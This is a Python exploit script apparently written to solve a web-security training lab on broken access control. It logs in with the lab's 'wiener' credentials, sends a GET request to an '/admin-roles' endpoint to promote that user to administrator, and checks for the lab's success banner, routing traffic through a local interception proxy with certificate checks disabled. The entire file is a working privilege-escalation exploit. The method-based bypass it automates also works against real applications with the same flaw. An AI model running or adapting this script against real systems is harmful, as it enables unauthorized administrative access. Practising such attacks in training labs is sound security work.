import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }

def promote_to_admin(s, url):

    # Login as regular user by given creds
    login_url = url + "/login"
    login_data = { "username" : "wiener", "password" : "peter" }

    r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print("(+) Login Sucessful")

        # Exploit the access control vulnerability to promote the user to admin
        admin_roles_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(admin_roles_url, verify=False, proxies=PROXIES)
        
        # verify the exploitation
        r = s.get(url, verify=False, proxies=PROXIES)
        res = r.text
        if "Congratulations, you solved the lab!" in res:
            print("(+) Exploitation successful")
            sys.exit(-1)
        else:
            print("(+) Exploitation failed")
            sys.exit(-1)
    else:
        print("(+) Could not login as the wiener user.")
        sys.exit(-1)


def main():
    if len(sys.argv) !=2:
        print("Usage: %s <url>" % sys.argv[0])
        print("(+) Example %s www.")
        sys.exit(1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    print("[*] Starting the exploit : Broken Access Control : Method-based access control :")
    promote_to_admin(s, url)

if __name__ =="__main__":
    main()